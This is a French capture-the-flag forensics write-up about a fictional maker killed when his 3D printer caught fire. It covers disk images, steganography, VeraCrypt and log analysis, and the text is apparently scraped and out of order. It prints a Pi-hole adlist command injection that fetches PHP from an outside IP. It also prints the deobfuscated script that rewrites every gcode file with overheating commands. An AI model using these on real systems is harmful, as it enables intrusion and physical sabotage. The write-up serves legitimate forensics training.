922. Kb8 Ka5 923. Kc7 Ka6 924. Kc8 Kb6 925. Kd8 Kb7 926. Kd7 Ka7 927. Kc8 Ka6 928. Kd8 Ka7 929. Kc7 Ka8 930. Kc6 Ka7 931. Kd7 Kb7 932. Ke6 Ka8 933. Ke7 Ka7 934. Kf8 Kb6 935. Ke8 Kc6 936. Kf7 Kb7 937. Ke6 Ka6 938. Ke5 Ka7 939. Ke6 Ka6 940. Kd5 Kb5 941. Ke6 Kc5 942. Kf7 Kd5 943. Kg8 Kc6 944. Kg7 Kb7 945. Kg6 Kc7 946. Kh7 Kb6 947. Kg8 Kc5 948. Kh8 Kd6 949. Kg7 Kc7 950. Kg6 Kd8 951. Kg5 Kc7 952. Kh4 Kb7 953. Kg4 Ka6 954. Kh5 Ka7 955. Kg4 Ka8 956. Kf4 Ka7 957. Kg4 Ka8 958. Kh5 Kb7 959. Kh6 Kc7 960. Kg5 Kb7 961. Kf5 Ka6 962. Kg4 Kb5 963. Kg3 Kb6 964. Kh2 Kc7 965. Kh1 Kc8 966. Kg2 Kb8 967. Kg3 Ka7 968. Kg2 Kb6 969. Kg3 Kc5 970. Kh4 Kc6 971. Kg3 Kc7 972. Kh2 Kd6 973. Kg3 Ke6 974. Kf3 Kd6 975. Kg2 Kc6 976. Kf2 Kc5 977. Kg3 Kd4 978. Kh2 Ke4 979. Kg2 Ke5 980. Kh1 Kd4 981. Kg2 Kc4 982. Kg3 Kc3 983. Kf2 Kc4 984. Ke2 Kd4 985. Kd2 Kc4 986. Kc1 Kb4 987. Kd2 Kb3 988. Kd1 Kc4 989. Ke2 Kb5 990. Kd2 Ka5 991. Kc1 Kb6 992. Kb2 Ka5 993. Ka3 Kb5 994. Kb3 Kc5 995. Ka4 Kd5 996. Kb4 Ke6 997. Ka5 Kd6 998. Kb6 Kd5 999. Ka7 Kc4 1000. Ka8 Kc5 1001. Kb8 Kd4 1002. Kb7 Kc3 1003. Ka8 Kb2 1004. Kb8 Kc2 1005. Kc8 Kd1 1006. Kb8 Kc2 1007. Ka7 Kd3 1008. Kb8 Ke4 1009. Kc8 Kf4 1010. Kb7 Kg4 1011. Kc7 Kh4 1012. Kb8 Kg3 1013. Ka8 Kh3 1014. Ka7 Kh4 1015. Kb6 Kg4 1016. Ka7 Kf3 1017. Kb8 Kg4 1018. Kb7 Kg3 1019. Kc7 Kf2 1020. Kd7 Ke1 1021. Kd8 Ke2 1022. Kd7 Kd3 1023. Kc8 Kd2 1024. Kd8 Kc2 1025. Kc7 Kc1 1026. Kb7 Kb1 1027. Kb6 Kb2 1028. Kc7 Kb3 1029. Kb7 Ka2 1030. Ka8 Ka3 1031. Ka7 Kb2 1032. Kb8 Ka1 1033. Kb7 Kb2 1034. Ka6 Kc1 1035. Ka5 Kb1 1036. Kb5 Kc1 1037. Ka6 Kc2 1038. Kb7 Kd3 1039. Kc6 Kc2 1040. Kb6 Kd2 1041. Kb5 Kc3 1042. Ka4 Kd4 1043. Ka5 Kd5 1044. Kb6 Ke6 1045. Kc7 Kf6 1046. Kd6 Kg6 1047. Kc6 Kf6 1048. Kb6 Kg7 1049. Kc6 Kh8 1050. Kc5 Kg8 1051. Kc6 Kg7 1052. Kb5 Kh6 1053. Ka6 Kg6 1054. Ka7 Kh5 1055. Kb7 Kg4 1056. Kb8 Kh3 1057. Ka7 Kh4 1058. Kb8 Kg5 1059. Kc7 Kh6 1060. Kd6 Kg7 1061. Ke7 Kg8 1062. Kd8 Kf8 1063. Kc7 Ke8 1064. Kc8 Ke7 1065. Kb7 Kf8 1066. Ka8 Ke8 1067. Kb7 Kd8 1068. Ka7 Ke7 1069. Kb6 Kd7 1070. Kb5 Kd6 1071. Kb4 Kc7 1072. Ka5 Kb8 1073. Kb6 Kc8 1074. Kc6 Kb8 1075. Kd6 Kc8 1076. Kc6 Kb8 1077. Kb6 Ka8 1078. Kb5 Ka7 1079. Kc6 Kb8 1080. Kd6 Kc8 1081. Kd5 Kd8 1082. Ke6 Ke8 1083. Ke5 Ke7 1084. Kf4 Kf7 1085. Kf3 Ke7 1086. Ke4 Kd7 1087. Ke5 Kc6 1088. Kf4 Kd7 1089. Kf5 Kd6 1090. Kf6 Kd7 1091. Kf5 Kd8 1092. Kg6 Kc7 1093. Kh7 Kd6 1094. Kg7 Ke5 1095. Kf8 Ke4 1096. Ke7 Kf3 1097. Kf7 Kg3 1098. Kf8 Kh3 1099. Ke8 Kh2 1100. Kf8 Kg1 1101. Ke8 Kh1 1102. Kd8 Kg1 1103. Kc8 Kf1 1104. Kc7 Kg2 1105. Kd7 Kf1 1106. Kc7 Ke1 1107. Kb8 Kf2 1108. Ka8 Kg1 1109. Kb7 Kf1 1110. Kb8 Ke1 1111. Ka7 Kd1 1112. Kb8 Kd2 1113. Kc7 Kc3 1114. Kb6 Kd3 1115. Ka6 Kc3 1116. Ka7 Kd2 1117. Kb8 Kc3 1118. Ka8 Kb2 1119. Ka7 Ka1 1120. Kb7 Kb1 1121. Ka6 Ka2 1122. Kb6 Kb2 1123. Ka7 Kc2 1124. Kb6 Kb3 1125. Ka6 Ka3 1126. Ka5 Kb3 1127. Ka6 Kc4 1128. Ka5 Kc5 1129. Ka4 Kd5 1130. Ka5 Kc4 1131. Ka4 Kd5 1132. Ka3 Kd6 { White resigns. } 0-1 Je d\u00e9cide d'effectuer quelques recherches sur ce format. Je tombe sur le d\u00e9pot github d'un certain \"jes\" https://github.com/jes/chess-steg qui a d\u00e9velopp\u00e9 un outil pour encoder/d\u00e9coder du texte au format pgn. Il met en plus \u00e0 disposition un outil en ligne : https://incoherency.co.uk/chess-steg/ Et cette fois ci, la piste de recherche prend tout son sens : On d\u00e9couvre une conversation entre \"Drewski\" et \"Yuri\". Drewski semble vouloir acheter quelques choses \u00e0 Yuri \u00e0 travers des cryptomonnaies, Drewski proc\u00e8de \u00e0 un paiement, et Yuri lui envoie un fichier \"stl\". Mais quelque chose se passe mal... car Yuri veut dans ses derniers messages, tuer Drewski. Drewski serait-il le maker mort dans l'incendie ? En attendant, j'ai mon 2\u00e8me flag : ECW{6d064b364f2a315c32fd25184256c1278b12ee73} + 50 points Lord of War 3/4 Piste de recherche : 2eme flag.txt Pour cette 3\u00e8me \u00e9tape, nous recherchons un deuxi\u00e8me fichier flag.txt sur l'image disque de la cl\u00e9 usb. Ce fichier est peut-\u00eatre cach\u00e9 dans les 2 fichiers pdf restant, o\u00f9 dans les 2 vid\u00e9os. Je remarque un d\u00e9tail important concernant les deux vid\u00e9os, elles font la m\u00eame dur\u00e9e, mais la vid\u00e9o VOST \u00e0 une taille pratiquement deux fois plus grandes que l'autre. onosh@siftworkstation:# ls -l |grep 'mp4' -rwxrwxrwx 1 onosh onosh 7858017 Oct 15 23:09 MrNigloR-S01-ep1.mp4 -rwxrwxrwx 1 onosh onosh 18215861 Oct 17 12:18 MrNigloR-S01-ep1-VOST.mp4 On pourrait penser que les sous-titres sont la cause de cette diff\u00e9rence de taille... je d\u00e9cide de les analyser ! onosh@siftworkstation:# du -h *mp4 7.5M MrNigloR-S01-ep1.mp4 18M MrNigloR-S01-ep1-VOST.mp4 La vid\u00e9o est l'\u00e9pisode 1 de la saison 1 de la s\u00e9rie Mister Robot. Un d\u00e9tail m'interpelle, certaines lettres dans les sous titres sont \u00e9crites en italiques : J'extrait les sous-titres de la vid\u00e9o avec l'outil ffmpeg : onosh@siftworkstation:# cat MrNigloR-S01-ep1-VOST_3_text.srt 1 00:00:00,700 --> 00:00:03,700 What is it about society that d<i>i</i>sappoints you so much? 2 00:00:11,000 --> 00:00:12,600 Oh, I <i>d</i>on't know. 3 00:00:13,200 --> 00:00:16,080 Is it that we collectively thought Steve J<i>o</i>bs 4 00:00:16,080 --> 00:00:18,000 Was a great man, even whe<i>n</i> we knew 5 00:00:18,000 --> 00:00:21,000 He made billions off <i>t</i>he backs of children? 6 00:00:23,000 --> 00:00:26,500 Or maybe it's that it feels l<i>i</i>ke all our heroes are counterfeit. 7 00:00:27,300 --> 00:00:30,000 The world itself's just one bi<i>g</i> hoax. 8 00:00:31,000 --> 00:00:34,300 Spamming with our run<i>n</i>ing commentary of bullshit 9 00:00:34,300 --> 00:00:39,100 masquerading as insight, <i>o</i>ur social media faking as intimacy. 10 00:00:41,000 --> 00:00:43,500 Or is it that we voted fo<i>r</i> this? 11 00:00:43,550 --> 00:00:43,550 scC<=:7b:?rCJAE$Ac4b 12 00:00:44,000 --> 00:00:46,000 Not with our rigged <i>e</i>lections, but with our things, 13 00:00:46,000 --> 00:00:47,700 our propert<i>y</i>, our money. 14 00:00:48,510 --> 00:00:51,100 I'm n<i>o</i>t saying anything new. We all know why we do this, 15 00:00:51,100 --> 00:00:53,200 not because H<i>u</i>nger Games books makes us happy 16 00:00:54,100 --> 00:00:55,800 but because we wanna <i>b</i>e sedated. 17 00:00:56,000 --> 00:00:58,600 Because it's painful n<i>o</i>t to pretend, 18 00:00:58,600 --> 00:01:00,000 <i>b</i>ecause we're cowards. 19 00:01:01,090 --> 00:01:03,100 Fuck societ<i>y.</i> On retrouve les caract\u00e8res en italiques encadr\u00e9 par les balises <i></i> . En les r\u00e9cup\u00e9rant un \u00e0 un, on obtient idontignoreyouboby. onosh@siftworkstation:# cat MrNigloR-S01-ep1-VOST_3_text.srt |grep '<i>' |cut -d\">\" -f2 |cut -d\"<\" -f1 |tr -d '\\n' idontignoreyouboby. Autre d\u00e9tail, je remarque dans les sous-titres la cha\u00eene scC<=:7b:?rCJAE$Ac4b mais elle semble \u00eatre chiffr\u00e9. L'un des PDF (Wiki.pdf) disponible sur la cl\u00e9 usb, on nous donne des informations sur le ROT13, une technique de chiffrement par d\u00e9calage : Vu l'alphabet utilis\u00e9 pour cette cha\u00eene chiffr\u00e9, le ROT13 n'est pas adapt\u00e9. En revanche le ROT47 oui, car il prend en charge les caract\u00e8res sp\u00e9ciaux, j'obtiens une cl\u00e9 : D4rklif3inCryptSp4c3 Maintenant, j'ai deux cl\u00e9s potentiels, mais je ne sais pas quoi en faire ! Apr\u00e8s quelques recherches par mots cl\u00e9s sur google, je trouve mon bonheur, un article de Korben qui semble int\u00e9ressant : Cacher un conteneur TrueCrypt dans une vid\u00e9o Que dit l'article : Martin Fiedler, un allemand portant le pseudo KeyJ a mis en ligne sur son blog, une m\u00e9thode permettant d\u2019int\u00e9grer dans une vid\u00e9o MP4, un conteneur TrueCrypt... Avant de commencer, il faut trouver un MP4 ou un MOV qui soit cr\u00e9dible pour le transport. C\u2019est \u00e0 dire un film qui soit suffisamment bien encod\u00e9 et de bonne qualit\u00e9, pour qu\u2019une augmentation de sa taille n\u2019\u00e9veille pas les soup\u00e7ons. Une s\u00e9rie de 500 Mo que vous ferez grimper \u00e0 700 Mo pourra faire l\u2019affaire si la qualit\u00e9 est au rendez-vous. Comment cela fonctionne ? Plus de d\u00e9tails Et si nous avions un container chiffr\u00e9 dans notre vid\u00e9o ? Cela expliquerai sa taille importante et l'existance des cl\u00e9s pour le d\u00e9chiffrer ! onosh@siftworkstation -> /tmp # mkdir /mnt/veracrypt onosh@siftworkstation -> /tmp # veracrypt -t MrNigloR-S01-ep1-VOST.mp4 /mnt/veracrypt/ Enter password for /tmp/MrNigloR-S01-ep1-VOST.mp4: Enter PIM for /tmp/MrNigloR-S01-ep1-VOST.mp4: Enter keyfile [none]: Protect hidden volume (if any)? (y=Yes/n=No) [No]: onosh@siftworkstation -> /tmp # ls -l /mnt/veracrypt/ total 5502 -rwx------ 1 root root 4106658 oct. 23 2019 Brandalism.pdf -rwx------ 1 root root 46 juil. 2 08:55 Flag.txt -rwx------ 1 root root 1521110 juil. 2 09:29 Liberator.gcode -rwx------ 1 root root 3150 juil. 2 08:43 xbdk.kdbx 3\u00e8me mission r\u00e9ussie ! le flag est \u00e0 nous : ECW{40474cc4ffb7874ebab39da9d1a16caaa9f06b07} + 100 points Lord of War 4/4 Pour ce dernier challenge, il n'y a pas de piste de recherche. Le container veracrypt contenait 3 autres fichiers : Un fichier pdf Un fichier gcode Un fichier kdbx onosh@siftworkstation -> /tmp # ls -l /mnt/veracrypt/ total 5502 -rwx------ 1 root root 4106658 oct. 23 2019 Brandalism.pdf -rwx------ 1 root root 46 juil. 2 08:55 Flag.txt -rwx------ 1 root root 1521110 juil. 2 09:29 Liberator.gcode -rwx------ 1 root root 3150 juil. 2 08:43 xbdk.kdbx Le fichier Brandalism.pdf n'est pas int\u00e9ressant car il est identique \u00e0 celui mis \u00e0 disposition par l'entreprise Brandalism sur internet (sha256sum identique). Le fichier Liberator.gcode semble int\u00e9ressant, car le \"gcode\" est un langage pour donner des instructions \u00e0 une imprimante 3D. Mais ce fichier ne cache aucun secret, \u00e0 part le logo des organisateurs du CTF. Le dernier fichier est un keepass, j'essaye de l'ouvrir avec la cl\u00e9 r\u00e9cup\u00e9r\u00e9 pr\u00e9c\u00e9demment idontignoreyouboby : Et \u00e7a marche, le flag de cette derni\u00e8re \u00e9tape de la premi\u00e8re partie \u00e9tait cach\u00e9 ici ! ECW{9dc2896d55b56eb19f59d544383f832644381817} + 100 points Partie II Cette deuxi\u00e8me partie est constitu\u00e9e de 3 \u00e9tapes et l'analyse se concentre sur l'image disque du rapsberry, c'est \u00e0 dire le fichier Raw2.dd Burn After Reading 1/3 On nous donne les informations suivantes : Suite de l'enqu\u00eate sur le maker d\u00e9c\u00e9d\u00e9 dans des conditions suspicieuses... Une piste de recherche : Point d'entr\u00e9e Ici, on doit chercher une trace, qui montrerait le point d'entr\u00e9e de l'attaquant. Et pour trouver une trace, on vise automatiquement les logs. Malheuresement, cette image disque du raspberry est chiffr\u00e9 avec Luks ! mais heureusement, le maker a enregistr\u00e9 la cl\u00e9 de d\u00e9chiffrement dans le fichier keepass : Il suffit de monter la partition chiffr\u00e9e avec la cl\u00e9 \"3DPiting\" : onosh@siftworkstation -> /tmp # cryptsetup luksOpen lapartitionluks.dd BRIOCHE Enter passphrase for lapartitionluks.dd: onosh@siftworkstation -> /tmp # mount -r /dev/mapper/BRIOCHE /mnt/lulu/ onosh@siftworkstation -> /tmp # ls -l /mnt/lulu/ total 88 drwxr-xr-x 2 root root 4096 mai 27 07:11 bin drwxr-xr-x 2 root root 4096 mai 27 07:24 boot drwxr-xr-x 4 root root 4096 mai 27 07:05 dev drwxr-xr-x 87 root root 4096 juil. 9 12:20 etc drwxr-xr-x 3 root root 4096 mai 27 07:10 home drwxr-xr-x 17 root root 4096 juil. 9 10:00 lib drwx------ 2 root root 16384 mai 27 07:24 lost+found drwxr-xr-x 2 root root 4096 mai 27 07:05 media drwxr-xr-x 2 root root 4096 mai 27 07:05 mnt drwxr-xr-x 4 root root 4096 juil. 9 09:42 opt drwxr-xr-x 2 root root 4096 mai 10 20:59 proc drwx------ 3 root root 4096 janv. 1 1970 root drwxr-xr-x 4 root root 4096 mai 27 07:05 run drwxr-xr-x 2 root root 4096 juil. 9 10:00 sbin drwxr-xr-x 2 root root 4096 mai 27 07:05 srv drwxr-xr-x 2 root root 4096 mai 10 20:59 sys drwxrwxrwt 7 root root 4096 juil. 9 16:54 tmp drwxr-xr-x 10 root root 4096 mai 27 07:05 usr drwxr-xr-x 12 root root 4096 juil. 9 09:34 var On a d\u00e9sormais acc\u00e8s au raspberry. Comme dit ci-dessus, nous recherchons une \"trace\", quoi de mieux que les logs pour trouver cela ? onosh@siftworkstation -> /m/lulu/ # ls -lart var/log/ total 18580 -rw-r--r-- 1 root root 0 mai 27 07:24 bootstrap.log drwx------ 2 root root 4096 mai 27 07:24 private -rw-r----- 1 root adm 211062 juil. 9 09:21 syslog.1 -rw-rw---- 1 root utmp 384 juil. 9 09:23 btmp drwxr-xr-x 12 root root 4096 juil. 9 09:34 .. -rw-r--r-- 1 root root 1380 juil. 9 09:41 alternatives.log -rw-r--r-- 1 root root 24000 juil. 9 09:41 faillog drwxr-x--- 2 www-data www-data 4096 juil. 9 09:42 lighttpd drwxr-xr-x 2 vboxadd 995 4096 juil. 9 09:43 pihole drwxr-xr-x 6 root root 4096 juil. 9 09:43 . drwxr-xr-x 2 root root 4096 juil. 9 10:48 apt -rw-r--r-- 1 root root 55060 juil. 9 10:52 dpkg.log -rw-r----- 1 root adm 2600 juil. 9 12:18 user.log -rw-r----- 1 root adm 16883 juil. 9 12:18 debug -rw-r----- 1 root adm 136403 juil. 9 13:22 messages -rw-rw-r-- 1 root utmp 292292 juil. 9 16:53 lastlog -rw-r----- 1 root adm 143132 juil. 9 16:53 kern.log -rw-r----- 1 root adm 96431 juil. 9 16:53 auth.log -rw-r--r-- 1 vboxadd 995 17953851 juil. 9 16:53 pihole.log -rw-r----- 1 root adm 115833 juil. 9 16:53 syslog -rw-r----- 1 root adm 168331 juil. 9 16:53 daemon.log -rw-r--r-- 1 vboxadd 995 15747 juil. 9 16:53 pihole-FTL.log -rw-rw-r-- 1 root utmp 16128 juil. 9 16:54 wtmp Nous savons que le maker est mort dans un incendie, suite \u00e0 l'attaque d'un pirate. Nous devons retrouver le point d'entr\u00e9e du pirate... le fichier auth.log semble \u00eatre l'un des plus pertinent pour lister les tentatives d'authentification. Je d\u00e9couvre des traces qui semblent malveillante vers 13:50:59 : Jul 9 10:42:22 raspberrypi usermod[11586]: add 'pihole' to group 'www-data' Jul 9 10:42:22 raspberrypi usermod[11586]: add 'pihole' to shadow group 'www-data' Jul 9 10:42:22 raspberrypi usermod[11592]: add 'www-data' to group 'pihole' Jul 9 10:42:23 raspberrypi usermod[11592]: add 'www-data' to shadow group 'pihole' Jul 9 13:50:59 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts Jul 9 13:50:59 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://mirror1.malwaredomains.com/files/justdomains Jul 9 13:51:00 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable http://sysctl.org/cameleon/hosts Jul 9 13:51:00 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://s3.amazonaws.com/lists.disconnect.me/simple_tracking.txt Jul 9 13:51:01 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://s3.amazonaws.com/lists.disconnect.me/simple_ad.txt Jul 9 13:51:01 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://hosts-file.net/ad_servers.txt Jul 9 13:51:02 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist add http://RUNXe2VkOTM3NWYzMGJkMjIwNzdjZmRkNDk3YWU3YzJhZWYxYmI0YjgzMmZ9Cg== Jul 9 13:51:04 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable http://RUNXe2VkOTM3NWYzMGJkMjIwNzdjZmRkNDk3YWU3YzJhZWYxYmI0YjgzMmZ9Cg== Jul 9 13:51:04 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist add http://2.57.116.54# -o fun.php -d Jul 9 13:51:06 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -g Jul 9 13:51:30 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -g Jul 9 13:51:53 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable http://2.57.116.54# -o fun.php -d Jul 9 13:51:53 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist add http://2.57.116.54# -o teleporter.php -d Jul 9 13:51:55 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -g Jul 9 13:52:17 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -g Jul 9 13:52:38 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -a -t L'utilisateur de \"pihole\", un outil pour bloquer les publicit\u00e9s, \u00e0 supprimer et ajouter des noms de domaines aux listes de blocage de pihole. Un nom de domaine est particulier : http://RUNXe2VkOTM3NWYzMGJkMjIwNzdjZmRkNDk3YWU3YzJhZWYxYmI0YjgzMmZ9Cg== Il s'agit d'une chaine encod\u00e9 en base64, et si on l'a d\u00e9code : onosh@siftworkstation -> /m/lulu/ # echo \"RUNXe2VkOTM3NWYzMGJkMjIwNzdjZmRkNDk3YWU3YzJhZWYxYmI0YjgzMmZ9Cg==\" |base64 -d ECW{ed9375f30bd22077cfdd497ae7c2aef1bb4b832f} Nous avons notre flag : ECW{ed9375f30bd22077cfdd497ae7c2aef1bb4b832f} + 50 points Burn After Reading 2/3 Piste de recherche : Fichiers Cibl\u00e9s Rappelons nous, Yuri, le pirate avait envoy\u00e9 un fichier \"STL\", ce fichier est utilis\u00e9 par les imprimantes 3D. Je d\u00e9cide d'analyser les fichiers que l'imprimante du maker \u00e0 utilis\u00e9. La solution \"octoprint\" est install\u00e9 sur le raspberry, cette solution permet de contr\u00f4ler les op\u00e9rations d'une imprimante 3D. Les fichiers imprim\u00e9s par l'imprimante sont stock\u00e9s dans le r\u00e9pertoire uploads/ onosh@siftworkstation -> /m/lulu/ # ls -lart home/pi/.octoprint/uploads/ total 62316 -rw------- 1 bsi bsi 1310133 juil. 9 13:03 CE3PRO_Table_Hanger.gcode -rw------- 1 bsi bsi 1561146 juil. 9 13:03 Liberator.gcode -rw------- 1 bsi bsi 41533989 juil. 9 13:03 CE3PRO_corona.gcode -rw------- 1 bsi bsi 3434681 juil. 9 13:03 CE3PRO_unbelievable.gcode -rw------- 1 bsi bsi 1099516 juil. 9 13:03 CE3PRO_MIG-29_kit.gcode -rw------- 1 bsi bsi 14846427 juil. 9 13:04 CE3PRO_Naomi__Wu.gcode On d\u00e9couvre 6 fichiers, ouvrons les tous ! CE3PRO_Table_Hanger.gcode CE3PRO_corona.gcode CE3PRO_MIG-29_kit.gcode CE3PRO_Naomi__Wu.gcode CE3PRO_unbelievable.gcode Cool, on a notre flag ! ECW{f79d8842c644881ddf017e0928e87710c0a15d84} + 50 points Burn After Reading 3/3 Piste de recherche : Le virus Pour cette derni\u00e8re et ultime \u00e9tape, nous devons retrouver le virus qui a tu\u00e9 le maker (non ce n'est pas le corona virus) On imagine qu'il y a une action sur l'imprimante pour que celle-ci prennent feu, et tue Drewski... Le meilleur moyen de retrouver ce \"virus\", est de tracer une timeline des \u00e9v\u00e9nement, le dernier jour ou le raspberry a fonctionn\u00e9. Actuellement, le seul \u00e9lement malveillant que nous avons, est le nom de domaine louche, ajout\u00e9 par le pirate \u00e0 travers pihole. La photo en plus grand L'ensemble de l'attaque est maintenant trac\u00e9e, un \u00e9l\u00e9ment est particuli\u00e8rement \u00e9trange... il s'agit du script basic-install.sh . C'est le premier \u00e9l\u00e9ment louche \u00e0 \u00eatre pr\u00e9sent sur le raspberry, d'une part par son horaire de cr\u00e9ation sur le serveur et d'autre part par son contenu. Voici un \u00e9chantillon de ce qu'il contient : #!/bin/bash ${*^^} \"${@}\"ba\"${@%4GJp}\"s'h' ${*%%x\\{&|q\\]l} \"${@/\\(mL\\'U./>l\\\"rs}\" <<< \"$( \"${@//F\\[sym/8%wS;k43}\" $'\\x70'rin''t'f' \"\\x$( ${@,} \\p\\ri\"\"\\nt''$'\\u0066' %s ';6Jb+l<2' \"${@##=#BHH}\" ${*~} | \"${@//x$Rdu;gr/VQos\\!yS}\" ${*,,} 'm'$'\\1445''s'$'\\u0075'm \"${@~}\" | $* ${*} $'\\x63'\"${@#T%EP#}\"u${*^}t -b $[ ((-56\"#\"k+-\"6\"1\"#\"\"$@\"e)+22#2\"7\") ]-$[ ((15#\"0\"+-3#\"${@/07Ueg+,@/d\\!Fm%}\"1\"${@/t9u&17#/h\\)V#wqQf}\"1)+5${*^^}3\"${@//Md=.RU</2=*P8o%v}\"#${@%%ecrN}m) ] ${*##nN2Wv} ${*,,} )\" ${@,} ; ${*//z\\}BWp+:} ${*//oxQaU2} pr\\in\\t''f \"\\x$( ${*//?I2jQpv} $'\\160\\x72'\"\"${*~}i$'\\x6e'\"t\"\"f\" %s 'dy52hd]8' ${*^} ${@#$&2\\)-=*#} | ${*,,} m''d5''$'\\u0073'um \"${@^}\" | \"${@/a0^SL,,}\" ${*~} cut -b $(( ((${!*}-53#a+4#\"${@/1Cg\\!JLUk}\"11)+57#k) ))-$[ ((-6\"# Le script bash semble avoir \u00e9t\u00e9 obfusqu\u00e9 avec Bashfuscator, malheuresement pour nous, il n'existe pas de d\u00e9sobfuscateur\u2026 Apr\u00e8s avoir sandboxer ce petit script, qui peut-\u00eatre contient un virus, je l'\u00e9x\u00e9cute pour voir ce qu'il me donne. Quelques secondes d'attente, et le code source d'une page web s'affiche, la page youtube d'un clip de Kenji Girac... Cela ne nous avance pas beaucoup... Analysons la structure du fichier : Il contient \u00e9norm\u00e9ment d'expression \u00e9trange comme ${@//\\{twl} Au d\u00e9but du fichier, nous avons une redirection (<<<) : ${*^^} \"${@}\"ba\"${@%4GJp}\"s'h' ${*%%x\\{&|q\\]l} \"${@/\\(mL\\`U./>l\\\"rs}\" <<< \"$( \"${@//F\\[sym/8%wS;k43}\" Ce fameux \"<<<\" permet en bash, d'afficher ou d'\u00e9x\u00e9cuter une commande en input. Que ce passe t'il si je remplace ${*^^} \"${@}\"ba\"${@%4GJp}\"s'h' ${*%%x\\{&|q\\]l} \"${@/\\(mL\\`U./>l\\\"rs}\" par un simple cat pour afficher la commande lanc\u00e9e... onosh@a154po4d2:/tmp# ./basic-install.sh curl 'https://www.youtube.com/watch?v=63K5VMx2BZM' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: VISITOR_INFO1_LIVE=fiPetRZgDXQ; YSC=JleF1aORUEc; GPS=1; CONSENT=WP.288b95' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' La commande curl qui r\u00e9cup\u00e8re la page youtube du clip de Kenji s'affiche, cool ! Le fichier cache peut \u00eatre une aute occurence de cette fameuse redirection \"<<<\" Je trouve une deuxi\u00e8me redirection identique ! Le fichier utilise un OU pour lancer deux commandes : bash <<< printf $(...) || bash <<< printf $(...) Je n'ai plus qu\u2019\u00e0 r\u00e9cup\u00e9rer la deuxi\u00e8me commande... M\u00eame op\u00e9ration que toute \u00e0 l'heure, j'ajoute cat devant le deuxi\u00e8me \"<<<\" : #ECW{7aaceb8d3e60402d94079707d2430c7394d916eb} files=$(find / -type f -name \"*.gcode\" 2>/dev/null) files=$(echo $files | tr \" \" \"\\n\") for file in $files do sz=$(wc -l $file) sz=$(echo $sz | cut -d \" \" -f1) div=\"2\" med=$(expr $sz / $div) cat $file |head -n $med > temp python -c 'print \"M107\\nM190 S105\\nM190 S105\\nM109 S250\"'>>temp x=$(cat $file |head -n $med | tail -n 1 | cut -d 'X' -f2 | cut -d '.' -f1) ((x2=$x+1)) python -c 'print(\"G1 E10 F100\\nG1 X'$x'\\nG1 E10 F100\\nG1 X'$x2'\\n\")*1000' >> temp cat $file |tail -n $med >> temp cat temp > $file rm temp done Nous avons notre dernier flag ! ECW{7aaceb8d3e60402d94079707d2430c7394d916eb} + 100 points Quel \u00e9tait l'objectif de ce virus ? Trouver tous les fichiers gcode pr\u00e9sent sur le raspberry Pour chaque fichier trouv\u00e9 : Il injecte une commande invalide \u00e0 la fin du fichier Un grand nombre de commandes invalides a peut-\u00eatre fait bruler l'imprimante !","title":"Maker is dead"},{"location":"ctf/ecw2020/forensicqualification/#maker-is-dead","text":"","title":"Maker is dead"},{"location":"ctf/ecw2020/forensicqualification/#contexte","text":"Un maker est retrouv\u00e9 mort dans un incendie, les pompiers d\u00e9clarent que la cause de l'incendie provient d'une imprimante 3D. Dans l'incendie, ils r\u00e9cup\u00e8rent une clef usb et un raspberry pi \u00e0 analyser.","title":"Contexte"},{"location":"ctf/ecw2020/forensicqualification/#partie-i","text":"","title":"Partie I"},{"location":"ctf/ecw2020/forensicqualification/#lord-of-war-14","text":"Piste de recherche : flag.txt Pour commencer, nous avons deux images disques : Raw1.dd qui correspond \u00e0 la cl\u00e9 USB retrouv\u00e9 Raw2.dd qui correspond au raspberry Les 4 premi\u00e8res \u00e9tapes du challenge consiste \u00e0 r\u00e9cup\u00e9rer des informations dans le Raw1.dd Je commence par lister le contenu de cette image : onosh@siftworkstation:# file Raw1.dd Raw1.dd: DOS/MBR boot sector; partition 1 : ID=0x7, start-CHS (0x0,32,33), end-CHS (0x79,222,37), startsector 2048, 1955840 sectors onosh@siftworkstation:# mmls Raw1.dd DOS Partition Table Offset Sector: 0 Units are in 512-byte sectors 